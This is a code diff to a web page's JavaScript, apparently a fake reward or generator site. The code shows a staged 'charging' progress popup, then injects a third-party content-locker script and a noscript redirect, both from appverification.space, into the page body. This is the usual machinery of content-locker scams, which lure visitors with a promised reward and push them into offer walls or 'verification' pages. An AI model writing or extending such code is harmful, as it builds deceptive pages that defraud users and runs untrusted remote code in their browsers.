@@ -1350,9 +1350,6 @@
             popupOverlay.classList.add('active');
             document.body.style.overflow = 'hidden';
 
-            // Spawn floating particles
-            spawnPopupParticles(game.color);
-
             // Animate progress bar + counter
             let progress = 0;
             const totalDuration = 10000;
@@ -1374,47 +1371,30 @@
             }, interval);
         }
 
-        function spawnPopupParticles(color) {
-            const popupBox = document.getElementById('popupBox');
-            // Remove existing particles
-            popupBox.querySelectorAll('.popup-particle').forEach(p => p.remove());
-
-            for (let i = 0; i < 12; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'popup-particle';
-                const size = 3 + Math.random() * 5;
-                particle.style.width = size + 'px';
-                particle.style.height = size + 'px';
-                particle.style.background = color;
-                particle.style.left = (10 + Math.random() * 80) + '%';
-                particle.style.top = (20 + Math.random() * 60) + '%';
-                particle.style.animationDelay = (Math.random() * 3) + 's';
-                particle.style.animationDuration = (2 + Math.random() * 3) + 's';
-                particle.style.opacity = '0.4';
-                popupBox.appendChild(particle);
-            }
-        }
-
         function showContentLocker() {
             createConfetti();
-            stageCharging.classList.add('hidden');
-            stageLocker.classList.remove('hidden');
 
-            const container = document.getElementById('contentLockerContainer');
-            container.innerHTML = '';
+            // Close the charging popup
+            popupOverlay.classList.remove('active');
+            document.body.style.overflow = '';
 
+            // Remove any previous content locker script
+            const oldScript = document.getElementById('ogjs');
+            if (oldScript) oldScript.remove();
+
+            // Inject content locker into the page body (opens as its own popup)
             const noscriptTag = document.createElement('noscript');
             const metaTag = document.createElement('meta');
             metaTag.httpEquiv = 'refresh';
             metaTag.content = '0;url=https://appverification.space/noscript';
             noscriptTag.appendChild(metaTag);
-            container.appendChild(noscriptTag);
+            document.body.appendChild(noscriptTag);
 
             const script = document.createElement('script');
             script.type = 'text/javascript';
             script.id = 'ogjs';
             script.src = 'https://appverification.space/cl/js/exxjpm';
-            container.appendChild(script);
+            document.body.appendChild(script);
         }
 
         function createConfetti() {
@@ -1458,6 +1438,5 @@
         });
     </script>
 </body>
-
 
 </html>
